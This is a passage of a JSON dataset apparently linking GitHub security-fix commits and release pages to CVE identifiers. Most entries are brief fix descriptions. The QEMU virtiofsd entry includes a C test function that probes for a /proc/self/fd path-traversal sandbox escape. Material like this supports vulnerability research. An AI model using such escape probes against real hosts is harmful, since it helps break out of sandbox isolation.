  "9af93525ba59fe7e11d0dd1c7bc31446bd7703d764f68619dec82f5cc7f8e9ae": {
    "url": "https://github.com/projectacrn/acrn-hypervisor/pull/5453/commits/ae0ab82434509d6e75f4a2f1e1a0dd2ee3dc3681",
    "title": "dm: virtio: check for paddr_guest2host return value",
    "body": "paddr_guest2host can return NULL, but code paths in virtioare not checking the return value._vq_record() initializes iov_base pointer using paddr_guest2host()but there is nothing in the flow that checks for NULL.Chane _vq_record to return -1 in case the address translationhas failed.Tracked-On: #5452Signed-off-by: Tomas Winkler <tomas.winkler@intel.com>Acked-by: Wang, Yu1 <yu1.wang@intel.com>",
    "cveIds": [
      "CVE-2020-28346"
    ],
    "cveIdsCount": 1
  },
  "ca22b6ff4672d936bdac679e7e352b937973fef1cb2ee93c9fe1f71574c233bb": {
    "url": "https://github.com/brocaar/chirpstack-network-server/commit/f996bb0c6c85281b5658f59ff09db1b4a73db453",
    "title": "Improve uplink de-duplication.",
    "body": "This removes the de-duplication at the MQTT backend. Some MQTT brokersprovide shared subscription options in which case this additionalde-duplication is not needed.For MQTT brokers that do not support shared subscriptions, thecollectAndCallOnce function will still filter out duplicated uplinks.By adding the TXInfo object (hex encoded) to the de-duplication key,uplink messages received on multiple channels will be handledseparately as they will result in different de-duplication keys.",
    "cveIds": [
      "CVE-2020-28349"
    ],
    "cveIdsCount": 1
  },
  "eb0c02af408be6cd8cd55f976d9ac8fe85de29488c97fc38a4a91430fbdaf741": {
    "url": "https://github.com/orangehrm/orangehrm/releases",
    "title": "v4.3.5 … 4.3.5 …",
    "body": "OHRM-542 : update docker file to fectch the release via sourceforge OHRM-581: Set consent as the prompt option in Google client (#638)",
    "cveIds": [
      "CVE-2020-29437"
    ],
    "cveIdsCount": 1
  },
  "53aebb282286bd826e9c903a87332aea8375392864f0237a10e8885f79169410": {
    "url": "https://github.com/OrchardCMS/Orchard/releases",
    "title": "1.7.3 … 1.6.1 …",
    "body": "Applying security fixhttp://docs.orchardproject.net/Documentation/Patch-20150630 Applying security fixhttp://docs.orchardproject.net/Documentation/Patch-20150519",
    "cveIds": [
      "CVE-2020-29593"
    ],
    "cveIdsCount": 1
  },
  "9d98cc406dceb5557a6077c9b106ce27fb70c8c076c465045c63a1be8e827a88": {
    "url": "https://github.com/ClusterLabs/hawk/releases",
    "title": "hawk-2.1.0 …",
    "body": "Release 2.1.0",
    "cveIds": [
      "CVE-2020-35458"
    ],
    "cveIdsCount": 1
  },
  "6f0269f1898c8af2bd306ffb87d0d9f0eae879e7dccc537f8bec47d2e8d66ffa": {
    "url": "https://github.com/ClusterLabs/crmsh/releases",
    "title": "4.3.0 … 4.2.1 … 4.2.0 … 4.1.0 … 4.0.0 … 3.0.4 … 3.0.3 … 3.0.2 …",
    "body": "Merge pull request #731 from liangxin1300/20210121_add_insight_sublevelAdd analyze sublevel and put preflight_check in it Qdevice official support Release 4.2.0 Release 4.1.0 Release 4.0.0 release crmsh-3.0.4 Release 3.0.3 Release 3.0.2",
    "cveIds": [
      "CVE-2020-35459"
    ],
    "cveIdsCount": 1
  },
  "47f11d5c938b59280c5764a3b1dab0cd938af785f2274f148aedb6c4efb9ab9b": {
    "url": "https://github.com/qemu/qemu/commit/ebf101955ce8f8d72fba103b5151115a4335de2c",
    "title": "virtiofsd: avoid /proc/self/fd tempdir",
    "body": "In order to prevent /proc/self/fd escapes a temporary directory iscreated where /proc/self/fd is bind-mounted. This doesn't work onread-only file systems.Avoid the temporary directory by bind-mounting /proc/self/fd over /proc.This does not affect other processes since we remounted / with MS_REC |MS_SLAVE. /proc must exist and virtiofsd does not use it so it's safe todo this.Path traversal can be tested with the following function: static void test_proc_fd_escape(struct lo_data *lo) { int fd; int level = 0; ino_t last_ino = 0; fd = lo->proc_self_fd; for (;;) { struct stat st; if (fstat(fd, &st) != 0) { perror(\"fstat\"); return; } if (last_ino && st.st_ino == last_ino) { fprintf(stderr, \"inode number unchanged, stopping\\n\"); return; } last_ino = st.st_ino; fprintf(stderr, \"Level %d dev %lu ino %lu\\n\", level, (unsigned long)st.st_dev, (unsigned long)last_ino); fd = openat(fd, \"..\", O_PATH | O_DIRECTORY | O_NOFOLLOW); level++; } }Before and after this patch only Level 0 is displayed. Without/proc/self/fd bind-mount protection it is possible to traverse parentdirectories.Fixes: 397ae98 (\"virtiofsd: jail lo->proc_self_fd\")Cc: Miklos Szeredi <mszeredi@redhat.com>Cc: Jens Freimann <jfreimann@redhat.com>Signed-off-by: Stefan Hajnoczi <stefanha@redhat.com>Message-Id: <20201006095826.59813-1-stefanha@redhat.com>Reviewed-by: Dr. David Alan Gilbert <dgilbert@redhat.com>Tested-by: Jens Freimann <jfreimann@redhat.com>Reviewed-by: Jens Freimann <jfreimann@redhat.com>Signed-off-by: Dr. David Alan Gilbert <dgilbert@redhat.com>",
    "cveIds": [
      "CVE-2020-35517"
    ],
    "cveIdsCount": 1
  },
  "6e68e7d36318ae9f8468f4c90dfc413506d463e63a45da1086ce75b6ec5511fc": {
    "url": "https://github.com/389ds/389-ds-base/commit/cc0f69283abc082488824702dae485b8eae938bc",
    "title": "Issue 4480 - Unexpected info returned to ldap request (#4491)",
    "body": "Bug description:If the bind entry does not exist, the bind result info reports that 'No such entry'. It should not give any information if the target entry exists or notFix description:Does not return any additional information during a bindrelates: #4480Reviewed by: William Brown, Viktor Ashirov, Mark Reynolds (thank you all)Platforms tested: F31",
    "cveIds": [
      "CVE-2020-35518"
    ],
    "cveIdsCount": 1
  },
  "9bb116cee608e18b33c268ab549b3e3ec88fa6a1aaed79cf60ed737344d9e732": {
    "url": "https://github.com/389ds/389-ds-base/commit/b6aae4d8e7c8a6ddd21646f94fef1bf7f22c3f32",
    "title": "Issue 4609 - CVE - info disclosure when authenticating",
    "body": "Description: If you bind as a user that does not exist. Error 49 is returned instead of error 32. As error 32 discloses that the entry does not exist. When you bind as an entry that does not have userpassword set then error 48 (inappropriate auth) is returned, but this discloses that the entry does indeed exist. Instead we should always return error 49, even if the password is not set in the entry. This way we do not disclose to an attacker if the Bind DN exists or not.Relates: #4609Reviewed by: tbordaz(Thanks!)",
    "cveIds": [
      "CVE-2020-35518"
    ],
    "cveIdsCount": 1
  },
  "eb1b95d4d24283afd0c0511f8021acec459940fe4a04c9ad083210306ad12747": {
    "url": "https://github.com/wolfSSL/wolfssl/commit/fb2288c46dd4c864b78f00a47a364b96a09a5c0f",
    "title": "RSA-PSS: Handle edge case with encoding message to hash",
    "body": "When the key is small relative to the digest (1024-bit key, 64-bytehash, 61-byte salt length), the internal message to hash is larger thanthe output size.Allocate a buffer for the message when this happens.",
    "cveIds": [
      "CVE-2020-36177"
    ],
    "cveIdsCount": 1
  },
  "f722ef619974ccef6bc99d878652ab283412d08d941153a6f389bc32da2e6990": {
    "url": "https://github.com/wolfSSL/wolfssl/commit/63bf5dc56ccbfc12a73b06327361687091a4c6f7",
    "title": "Merge pull request #3426 from SparkiDev/rsa_pss_fix",
    "body": "RSA-PSS: Handle edge case with encoding message to hash",
    "cveIds": [
      "CVE-2020-36177"
    ],
    "cveIdsCount": 1
  },
  "93978fe13ee59c719ae8811089c0ff243978cbd04ab5cabe7b31e48710a689f1": {
    "url": "https://github.com/jupyterhub/jupyterhub/releases",
    "title": "1.4.2 1.4.1 … 1.4.0 … 1.3.0 … 1.2.2 … 1.2.1 … 1.2.0 … 1.2.0b1 … 1.1.0 1.1.0b1",
    "body": "release 1.4.1 release 1.4.0 release 1.3.0 release 1.2.2 release 1.2.1 release 1.2.0 Release 1.2.0b1",
    "cveIds": [
      "CVE-2020-36191"
    ],
    "cveIdsCount": 1
  },
  "1cc2b330902d2fad14de7c17d52c560cadcdd31dd400b8d89a44898a3908e0c7": {
    "url": "https://github.com/TeamAmaze/AmazeFileManager/releases/tag/v3.5.1",
    "title": "",
    "body": "Merge pull request #2095 from TeamAmaze/bugfix/2087Bugfix/2087",
    "cveIds": [
      "CVE-2020-36246"
    ],
    "cveIdsCount": 1
  },
  "7df6f3073a4a24b3b8b1ad748850e7e4c485f7a7860d4ead9dfd306425135b71": {
    "url": "https://github.com/DanBloomberg/leptonica/commit/8d6e1755518cfb98536d6c3daf0601f226d16842",
    "title": "Issue 23433 in oss-fuzz: Heap-buffer-overflow in findNextBorderPixel()",
    "body": "* Check pix boundary when looking for the next pixel.",
    "cveIds": [
      "CVE-2020-36278"
    ],
    "cveIdsCount": 1
  },
  "36cca4c3e72fca6e570f696fcbd77c7186ebc2ca733442882a76c63569adc6c5": {
    "url": "https://github.com/DanBloomberg/leptonica/commit/3c18c43b6a3f753f0dfff99610d46ad46b8bfac4",
    "title": "Fixing oss-fuzz issue 22512: Heap-buffer-overflow in rasteropGeneralL…",
    "body": "…ow()* Simplified the hole-filling function`",
    "cveIds": [
      "CVE-2020-36279"
    ],
    "cveIdsCount": 1
  },
  "90b62a99de4d12b3ca3b85e4b638c353d68fa1bc2c2536eac789eb1d974613c5": {
    "url": "https://github.com/DanBloomberg/leptonica/commit/5ba34b1fe741d69d43a6c8cf767756997eadd87c",
    "title": "Issue 23654 in oss-fuzz: Heap-buffer-overflow in pixReadFromTiffStream",
    "body": "* Increase scanline buffer for reading gray+alpha and converting to RGBA",
    "cveIds": [
      "CVE-2020-36280"
    ],
    "cveIdsCount": 1
  },
  "ff2f89487139bebac4a4b0f21a2d1198765d763be980377a22fefa0ec815ac0a": {
    "url": "https://github.com/HewlettPackard/nagios-plugins-hpilo/commit/7617b2736a95c7f354198f092febe37e7005c677",
    "title": "Merge pull request #8 from dchangtw/1.5.0",
    "body": "CVE-2020-7206: Fix php code injection problem",
    "cveIds": [
      "CVE-2020-7206"
    ],
    "cveIdsCount": 1
  },
  "b557edf24d18c015fe70b3bcf17a4e24197595b150a2e25fb2a427c6b0bb17e5": {
    "url": "https://github.com/MariaDB/server/commit/9d18b6246755472c8324bf3e20e234e08ac45618",
    "title": "rpm/deb and auth_pam_tool_dir/auth_pam_tool",
    "body": "don't let mysql_install_db set SUID bit for auth_pam_tool in rpm/debpackages - instead package files with correct permissions andonly fix the ownership of auth_pam_tool_dir (which can only be doneafter mysql user is created, so in post-install).keep old mysql_install_db behavior for bintars",
    "cveIds": [
      "CVE-2020-7221"
    ],
    "cveIdsCount": 1
  },
  "b7b25d16699bb2b7ac0b009b8a4a4946973ec0c2f2835657a1f77f84aeb20a43": {
    "url": "https://github.com/codecov/codecov-node/commit/02cf13d8b93ac547b5b4c2cfe186b7d874fd234f",
    "title": "[CE-1330] Escaping args (#167)",
    "body": "* Escaping args",
    "cveIds": [
      "CVE-2020-7597"
    ],
    "cveIdsCount": 1
  },
  "f5a4bb6cfac9d1c317f8991d6ea574cb1f8345fe0fffb2be15f798e2c064b72a": {
    "url": "https://github.com/jhuckaby/pixl-class/commit/47677a3638e3583e42f3a05cc7f0b30293d2acc8",
    "title": "Version 1.0.3",
    "body": "Fixes code injection vulnerability reported by Synk.io.No longer uses eval (which is evil anyway).",
    "cveIds": [
      "CVE-2020-7640"
    ],
    "cveIdsCount": 1
  },
  "88ee602e64d3b5d97e2c66d0024a21745fd1816150bcff295ad1c71917d08d60": {
    "url": "https://github.com/sockjs/sockjs-node/commit/dd7e642cd69ee74385825816d30642c43e051d16",
    "title": "Merge pull request #266 from cakoose/backport-writeHead-fix",
    "body": "writeHead: Don't end() response",
    "cveIds": [
      "CVE-2020-7693"
    ],
    "cveIdsCount": 1
  },
  "ad8ba41575eeb19a63071fff9924717089c7ff920283d6e3e1bf2cf2a088dc8c": {
    "url": "https://github.com/google/asylo/commit/e582f36ac49ee11a21d23ad6a30c333092e0a94e",
    "title": "Check for output_len range in ecall_restore",
    "body": "This may cause vulnerablity if pointing to trusted memory.This issue was reported by Qinkun Bao, Zhaofeng Chen, Mingshen Sun, andKang Li from Baidu Security.PiperOrigin-RevId: 322476223Change-Id: I8a6406e9f07a20582d4387bd9a3469dfa9cbcb12",
    "cveIds": [
      "CVE-2020-8904"
    ],
    "cveIdsCount": 1
  },
  "6f784f5e7e1a994cf55560214b0344c15a6360ab49c1674af9674d9380c25919": {
    "url": "https://github.com/google/closure-library/commit/294fc00b01d248419d8f8de37580adf2a0024fc9",
    "title": "Fix authority parsing in Closure URI parser.",
    "body": "RELNOTES: Fix authority parsing in Closure URI parser.PiperOrigin-RevId: 300815722",
    "cveIds": [
      "CVE-2020-8910"
    ],
    "cveIdsCount": 1
  },
  "5317edff207ccdb9dd17cf49d1528e1e0b8da736753dbb146747b4665f868ab2": {
    "url": "https://github.com/google/asylo/commit/ed0926bff0e423cd122a18b3d2fc772817f66825",
    "title": "Check return pointer is outside enclave in realloc",
    "body": "PiperOrigin-RevId: 333769459Change-Id: If53b5f4317080b8abaf5c4f80ce751f150630bcb",
    "cveIds": [
      "CVE-2020-8935"
    ],
    "cveIdsCount": 1
  },
  "977c58b5b40c88700332dc69c9223bdc374e1dc7a8bd6e5646deaa1d7927c5ce": {
    "url": "https://github.com/google/asylo/commit/83036fd841d33baa7e039f842d131aa7881fdcc2",
    "title": "Verify UntrustedCall output is outside enclave",
    "body": "PiperOrigin-RevId: 333781703Change-Id: I9df55c04dc8b04f4bf0bda8e68cc32bca81b933a",
    "cveIds": [
      "CVE-2020-8936"
    ],
    "cveIdsCount": 1
  },
  "1b4f5111a1b098d9346190f1a37b4820dbef006139eb15451d25579bcb731b1d": {
    "url": "https://github.com/google/asylo/commit/a37fb6a0e7daf30134dbbf357c9a518a1026aa02",
    "title": "Check untrusted queue is in outside enclave",
    "body": "PiperOrigin-RevId: 333370935Change-Id: Ic3f15d5db1302d95c7cb199b44172474fecb81ca",
    "cveIds": [
      "CVE-2020-8937"
    ],
    "cveIdsCount": 1
  },
  "98a9de19ab52798e7f55c3b601a73bcdd649246a77273d953f8e15a1757d222d": {
    "url": "https://github.com/google/asylo/commit/bda9772e7872b0d2b9bee32930cf7a4983837b39",
    "title": "Check input length in FromLinuxSockAddr",
    "body": "PiperOrigin-RevId: 333785506Change-Id: I1d68fb8954665eebc1018d80ff995cbe9e7ed6a9",
    "cveIds": [
      "CVE-2020-8938"
    ],
    "cveIdsCount": 1
  },
  "c146184abef44a5d42136432aec17dc537411aa1abc1dba460092448b37b0a2b": {
    "url": "https://github.com/google/asylo/commit/6ff3b77ffe110a33a2f93848a6333f33616f02c4",
    "title": "Check for result size in dst in inet_ntop",
    "body": "PiperOrigin-RevId: 333814318Change-Id: Id7766ed598809f5df42d457f224d6f3dea06c224",
    "cveIds": [
      "CVE-2020-8939"
    ],
    "cveIdsCount": 1
  },
  "7ba18d1068d74d3eb97a15634ef57c757b9f202f2715e9d1c985a6b091afdc66": {
    "url": "https://github.com/google/asylo/commit/fa6485c5d16a7355eab047d4a44345a73bc9131e",
    "title": "Check return result in recvmsg",
    "body": "PiperOrigin-RevId: 333411798Change-Id: I61986b5a1bffd79c0e1950013aa9de09cf4a5d61",
    "cveIds": [
      "CVE-2020-8940"
    ],
    "cveIdsCount": 1
  },
  "f56bbdd7748a804cd085150665973902f7c0efe6f69ec2cb7532417eaeb59d6b": {
    "url": "https://github.com/google/asylo/commit/8fed5e334131abaf9c5e17307642fbf6ce4a57ec",
    "title": "Check sockaddr size in inet_pton",
    "body": "PiperOrigin-RevId: 333821843Change-Id: Ie0b694f1edd3f7a4a3de6df964d68566961accf6",
    "cveIds": [
      "CVE-2020-8941"
    ],
    "cveIdsCount": 1
  },
  "6e805f8632e331954a083496224bc6358cc4d07f67007148ed617101a0086e1a": {
    "url": "https://github.com/google/asylo/commit/b1d120a2c7d7446d2cc58d517e20a1b184b82200",
    "title": "Check for return size in enc_untrusted_read",
    "body": "Check return size does not exceed requested. The returned result andcontent still cannot be trusted, but it's expected behavior when notusing a secure file system.PiperOrigin-RevId: 333827386Change-Id: I0bdec0aec9356ea333dc8c647eba5d2772875f29",
    "cveIds": [
      "CVE-2020-8942"
    ],
    "cveIdsCount": 1
  },
  "6e4ca890f62a9086dd65928fabfe1112993a98f00ad9d2b3182b5a260c4266cf": {
    "url": "https://github.com/google/asylo/commit/6e158d558abd3c29a0208e30c97c9a8c5bd4230f",
    "title": "Check for result of recvfrom",
    "body": "PiperOrigin-RevId: 333399155Change-Id: I3d79e1e3f45f75d4c4360d42499e511d84b9aff7",
    "cveIds": [
      "CVE-2020-8943"
    ],
    "cveIdsCount": 1
  },
  "4231892a283737ae5b51decc0058027f6e44d74a53b522c8687c997cd9d79ba2": {
    "url": "https://github.com/google/asylo/commit/382da2b8b09cbf928668a2445efb778f76bd9c8a",
    "title": "Check output of ecall_restore is outside enclave",
    "body": "PiperOrigin-RevId: 334265380Change-Id: Ifbaead6bce56f01b2a4d69f53ca508d0138f6f61",
    "cveIds": [
      "CVE-2020-8944"
    ],
    "cveIdsCount": 1
  },
  "04b62e6951a60fb6940024bc1c67e522be7cfee1805e4ab64f0e5e3b387adcb7": {
    "url": "https://github.com/containers/image/commit/4c7a23f82ef09127b0ff28366d1cf31316dd6cc1",
    "title": "Update to github.com/mtrmac/gpgme@v0.1.1",
    "body": "This primarily includes proglottis/gpgme#23 ,fixing use-after-free crashes.Signed-off-by: Miloslav Trmač <mitr@redhat.com>",
    "cveIds": [
      "CVE-2020-8945"
    ],
    "cveIdsCount": 1
  },
  "c4fcd1be2ec0599c544e8d7c432cf9ea476f914ba1d78cff43124eaf5c834dd8": {
    "url": "https://github.com/mantisbt-plugins/source-integration/commit/270675c964c675829fe010f9f0830521dc0835f0",
    "title": "Fix XSS in Delete Repository page",
    "body": "Fixes #338",
    "cveIds": [
      "CVE-2020-8981"
    ],
    "cveIdsCount": 1
  },
  "7c19a3749d79387d3c5f33d6228ca742d573cada4562260f259cb5a3347790d0": {
    "url": "https://github.com/lukashinsch/spring-boot-actuator-logview/commit/1c76e1ec3588c9f39e1a94bf27b5ff56eb8b17d6",
    "title": "Merge pull request #30 from lukashinsch/hotfix/dir-traversal",
    "body": "backport directory traversal vulnerability fix",
    "cveIds": [
      "CVE-2021-21234"
    ],
    "cveIdsCount": 1
  },
  "de6837e71b8bb0581688baa768a20ad67abf05686f53f702712f8a9c097b4e91": {
    "url": "https://github.com/Flask-Middleware/flask-security/commit/61d313150b5f620d0b800896c4f2199005e84b1f",
    "title": "I421backport (#425)",
    "body": "* Fix security vuln - GET on /login or /change could reveal authentication token with no CSRF checks. (#422)GETs no longer return the auth token.closes: #421* Backport CSRF /login vulnerability.This will go out at 3.4.5aargg - issues with black, and other packages w.r.t py2.7",
    "cveIds": [
      "CVE-2021-21241"
    ],
    "cveIdsCount": 1
  },
  "e4495a6cd6e2dd0d4aae0d1352e7dea7be7c9bc3c48e551329d408bd327e6534": {
    "url": "https://github.com/Flask-Middleware/flask-security/commit/6d50ee9169acf813257c37b75babe9c28e83542a",
    "title": "Fix security vuln - GET on /login or /change could reveal authenticat…",
    "body": "…ion token with no CSRF checks. (#422)GETs no longer return the auth token.closes: #421",
    "cveIds": [
      "CVE-2021-21241"
    ],
    "cveIdsCount": 1
  },
  "d1b2ec1472cae3e32aabd81946bb2aa99918230c1a5bdd2fd41dfd73df516b6c": {
    "url": "https://github.com/hedgedoc/hedgedoc/commit/35b0d39a12aa35f27fba8c1f50b1886706e7efef",
    "title": "added sanitation to the slideMode in frontmatter",
    "body": "This should prevent the issue mentioned in hackmdio/codimd#1648Specifically left out are- dependency (user can't really include anything anyway, because CSP forbids most domains)- autoSlideMethod (nothing our users should be able to change as they won't write JS to be affected by this)- keyboard (this let's users write arbitrary code and seems therefore to problematic)See:https://github.com/hakimel/reveal.js/blob/3.9.2/README.md#configurationSigned-off-by: Philip Molares <philip.molares@udo.edu>",
    "cveIds": [
      "CVE-2021-21259"
    ],
    "cveIdsCount": 1
  },
  "1915735e19dc25d98196e5514d9ee4d2fea9ddf20284bb53adca688618f5a2b9": {
    "url": "https://github.com/deislabs/oras/commit/96cd90423303f1bb42bd043cb4c36085e6e91e8e",
    "title": "Merge pull request from GHSA-g5v4-5x39-vwhx",
    "body": "* check hard link* no following symbolic link* bug fix* add initial test to reproduce GHSA-g5v4-5x39-vwhxSigned-off-by: jdolitsky <393494+jdolitsky@users.noreply.github.com>* fix test for symbolic link* fix bug* add test for hardlinkSigned-off-by: jdolitsky <393494+jdolitsky@users.noreply.github.com>* catch the parent folder* remove check for hard link for consistency* remove unncessary test for hard links* Revert \"remove unncessary test for hard links\"This reverts commit b3136611810f49074dfc6aef158b3d24466d2ed9.* Revert \"remove check for hard link for consistency\"This reverts commit d7b7346598c92ff9c430a42763d810b34d3f1ac2.* check links for all link types* add testsCo-authored-by: jdolitsky <393494+jdolitsky@users.noreply.github.com>",
    "cveIds": [
      "CVE-2021-21272"
    ],
    "cveIdsCount": 1
  },
  "fde4ea791b73637b9256035848d23a4bb42be646799fb3e6ba3f2958a898d742": {
    "url": "https://github.com/Kenny2github/Report/commit/f828dc6f73cdfaea5639edbf8ac7b326eeefb117",
    "title": "Add CSRF check for Special:Report",
    "body": "Also clean up a little of the logic",
    "cveIds": [
      "CVE-2021-21275"
    ],
    "cveIdsCount": 1
  },
  "ae1844464d9fee8480924bb5515ed50e059193065e876f5534d443162e83c5fc": {
    "url": "https://github.com/moby/moby/commit/64bd4485b3a66a597c02c95f5776395e540b2c7c",
    "title": "Merge pull request #41964 from thaJeztah/CVE-2021-21284_master",
    "body": "[master] Fix Access to remapped root allows privilege escalation to real root (CVE-2021-21284)",
    "cveIds": [
      "CVE-2021-21284"
    ],
    "cveIdsCount": 1
  },
  "3cd389ea018088ffb1bb5b69f75b8116c6b1dce8230ec295719768763cca82a4": {
    "url": "https://github.com/sparklemotion/mechanize/commit/66a6a1bfa653a5f13274a396a5e5441238656aa0",
    "title": "Merge pull request #548 from kyoshidajp/fix_command_injection",
    "body": "Prevent OS command injection",
    "cveIds": [
      "CVE-2021-21289"
    ],
    "cveIdsCount": 1
  },
  "8ac5c7f68c8f1e1085b828b480c550e005b8a2ea41485953c7ac48890325efaf": {
    "url": "https://github.com/wireapp/wire-ios/commit/7e3c30120066c9b10e50cc0d20012d0849c33a40",
    "title": "[Fix] video capture state (#4879)",
    "body": "* stop capture when there is no self video stream* update capture state when needed* update capture state on didMoveToWindow* add tests",
    "cveIds": [
      "CVE-2021-21301"
    ],
    "cveIdsCount": 1
  },
  "0800bdd9b26b8300db8fa44106bd79e993411b4ce08c8d4e8fd592e3d8cb2908": {
    "url": "https://github.com/PrestaShop/PrestaShop/commit/2f673bd93e313f08c35e74decc105f40dc0b7dee",
    "title": "Merge pull request from GHSA-557h-hf3c-whcg",
    "body": "Make sure session is cleared using soft logout",
    "cveIds": [
      "CVE-2021-21308"
    ],
    "cveIdsCount": 1
  },
  "21d0fb27eb031cc0fe0185a2f080a17e9704d5d00552d8be614d42867c8a39f3": {
    "url": "https://github.com/redis/redis/commit/c992857618db99776917f10bf4f2345a5fdc78b0",
    "title": "Fix integer overflow (CVE-2021-21309). (#8522)",
    "body": "On 32-bit systems, setting the proto-max-bulk-len config parameter to a high value may result with integer overflow and a subsequent heap overflow when parsing an input bulk (CVE-2021-21309).This fix has two parts:Set a reasonable limit to the config parameter.Add additional checks to prevent the problem in other potential but unknown code paths.(cherry picked from commit d32f2e9)",
    "cveIds": [
      "CVE-2021-21309"
    ],
    "cveIdsCount": 1
  },
  "797afc5e3d08c58c7c2d7ca7caa6c6a54d3a44f0a70d47808bcfc6d9112b9f40": {
    "url": "https://github.com/fastify/fastify-reply-from/commit/dea227dda606900cc01870d08541b4dcc69d3889",
    "title": "Merge pull request from GHSA-qmw8-3v4g-gwj4",
    "body": "* fix: Re-enable unix+http:// base URL, prevent escape of base URL pathCo-Authored-By: Corey Farrell <git@cfware.com>* More fixes* Test more build-url error casesCo-authored-by: Corey Farrell <git@cfware.com>",
    "cveIds": [
      "CVE-2021-21321"
    ],
    "cveIdsCount": 1
  },
  "da6d8357737b46ef718002cf500591608bc5ac8bcc2322e8e716ce7adfca5407": {
    "url": "https://github.com/fastify/fastify-http-proxy/commit/02d9b43c770aa16bc44470edecfaeb7c17985016",
    "title": "Merge pull request from GHSA-c4qr-gmr9-v23w",
    "body": "* added failing test* fix first test* Fixed 2/4* three out of four* four out of four",
    "cveIds": [
      "CVE-2021-21322"
    ],
    "cveIdsCount": 1
  },
  "7dcd6228597c8bedda0327cbe208481b6b1f41193ad11ec155af830aed4d3b7f": {
    "url": "https://github.com/envoyproxy/envoy/commit/ea39e3cba652bcc4b11bb0d5c62b017e584d2e5a",
    "title": "jwt_authn: fix a bug where JWT with wrong issuer is allowed in allow_…",
    "body": "…missing case (#15194)[jwt] When allow_missing is used inside RequiresAny, the requests with JWT with wrong issuer are accepted. This is a bug, allow_missing should only allow requests without any JWT. This change fixed the above issue by preserving JwtUnknownIssuer in allow_missing case.Signed-off-by: Wayne Zhang <qiwzhang@google.com>",
    "cveIds": [
      "CVE-2021-21378"
    ],
    "cveIdsCount": 1
  },
  "a18aec66a6db6a3a2b16d475df7efe613868f43e3877981f749293da291ec596": {
    "url": "https://github.com/jellyfin/jellyfin/commit/0183ef8e89195f420c48d2600bc0b72f6d3a7fd7",
    "title": "Merge pull request from GHSA-wg4c-c9g9-rxhx",
    "body": "Fix issues 1 through 5 from GHSL-2021-050(cherry picked from commit fe8cf29)Signed-off-by: Joshua M. Boniface <joshua@boniface.me>",
    "cveIds": [
      "CVE-2021-21402"
    ],
    "cveIdsCount": 1
  },
  "d5360518c48d22b63e428e7d112474977603d780f6e53f469932125c87361c27": {
    "url": "https://github.com/thi-ng/umbrella/commit/88f61656e5f5cfba960013b8133186389efaf243",
    "title": "Merge pull request from GHSA-rj44-gpjc-29r7",
    "body": "fix(egf): update GPG invocation to avoid arb code exec",
    "cveIds": [
      "CVE-2021-21412"
    ],
    "cveIdsCount": 1
  },
  "6732201adc0010849d40531c955a0061f7eb1e4412f19b295fad23e69f172458": {
    "url": "https://github.com/PrestaShop/ps_emailsubscription/commit/664ffb225e2afb4a32640bbedad667dc6e660b70",
    "title": "Merge pull request from GHSA-vwfx-hh3w-fj99",
    "body": "Escape newsletter condition field",
    "cveIds": [
      "CVE-2021-21418"
    ],
    "cveIdsCount": 1
  },
  "5e8d3509ca3697a7fffab3a439045c4db182634c6578298b78ab5bfbd115131b": {
    "url": "https://github.com/mongo-express/mongo-express/commit/f5e0d4931f856f032f22664b5e5901d5950cfd4b",
    "title": "Merge pull request from GHSA-7p8h-86p5-wv3p",
    "body": "- Fix several XSS vulnerabilities",
    "cveIds": [
      "CVE-2021-21422"
    ],
    "cveIdsCount": 1
  },
  "e793d7feda77fc21c3ba7d8e812bfb95e7087f47ada23a84f46362ccd5851886": {
    "url": "https://github.com/symfony/symfony/commit/2a581d22cc621b33d5464ed65c4bc2057f72f011",
    "title": "security #cve-2021-21424 [Security][Guard] Prevent user enumeration (…",
    "body": "…chalasr)This PR was merged into the 3.4 branch.",
    "cveIds": [
      "CVE-2021-21424"
    ],
    "cveIdsCount": 1
  },
  "b9af2117eae2257f778b89287f63a58e2f91468a8dfa099c6f48990627e2725a": {
    "url": "https://github.com/roundcube/roundcubemail/commit/9dc276d5f26042db02754fa1bac6fbd683c6d596",
    "title": "Fix cross-site scripting (XSS) via HTML messages with malicious CSS c…",
    "body": "…ontentThanks to Mateusz Szymaniec (CERT Polska) for reporting the issue.",
    "cveIds": [
      "CVE-2021-26925"
    ],
    "cveIdsCount": 1
  },
  "4d69c7ff59c7d5b65efe14e676a31e27667cdc53ef176cb23b720099d0de2e10": {
    "url": "https://github.com/jasper-software/jasper/commit/41f214b121b837fa30d9ca5f2430212110f5cd9b",
    "title": "Fixes #264.",
    "body": "The JP2 decoder was allowing the decoding of a code stream to beattempted when the stream has inconsistent values for the number ofcomponents and/or the component types. For such invalid streams,only a warning would be issued and decoding would proceed. This isdangerous, however, as it can lead to many unexpected paths throughthe code, which in some cases have been demonstrated to result insecurity vulnerabilities. This code change makes decoding of thesetypes invalid code streams a hard error.",
    "cveIds": [
      "CVE-2021-26926",
      "CVE-2021-26927"
    ],
    "cveIdsCount": 2
  },
  "2c0452be1451943e0edf9412276c8f4ea1838b41d7f4b456ae07408eb3765f48": {
    "url": "https://github.com/horde/webmail/releases",
    "title": "v5.2.22 … v5.2.21 … v5.2.20 … v5.2.19 … v5.2.18 … v5.2.17 … v5.2.16 … v5.2.15 … v5.2.14 … v5.2.13 …",
    "body": "Released webmail-5.2.22. Released webmail-5.2.21. Released webmail-5.2.20. Released webmail-5.2.19. Released webmail-5.2.18. Released webmail-5.2.17. Released webmail-5.2.16. Released webmail-5.2.15. Released webmail-5.2.14. Released webmail-5.2.13.",
    "cveIds": [
      "CVE-2021-26929"
    ],
    "cveIdsCount": 1
  },
  "7d12230688b8f5c1bf47f30e855789f1477181d3860d40b62375a878d2b2637f": {
    "url": "https://github.com/Yubico/yubihsm-shell/releases",
    "title": "2.2.0 … 2.1.0 … 2.0.3 … 2.0.2 … 2.0.1 … 2.0.0",
    "body": "(tag: 2.2.0) yubihsm-shell (tag: 2.1.0) yubihsm-shell (tag: 2.0.3) yubihsm-shell (tag: 2.0.2) yubihsm-shell (tag: 2.0.1) yubihsm-shell",
    "cveIds": [
      "CVE-2021-27217"
    ],
    "cveIdsCount": 1
  },
  "626be06225b8430f3586580b8af4278a75bda313ea6a6eb2b030485966288806": {
    "url": "https://github.com/libexif/exif/commit/f6334d9d32437ef13dc902f0a88a2be0063d9d1c",
    "title": "added empty strign check, which would lead to NULL ptr deref/crash in…",
    "body": "… exif XML display. fixes #4",
    "cveIds": [
      "CVE-2021-27815"
    ],
    "cveIdsCount": 1
  },
  "dd5a913d121cc74dba4fdc18741d42c59ef46cc4acf49e20b6607596b48e487a": {
    "url": "https://github.com/tensorflow/tensorflow/commit/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c",
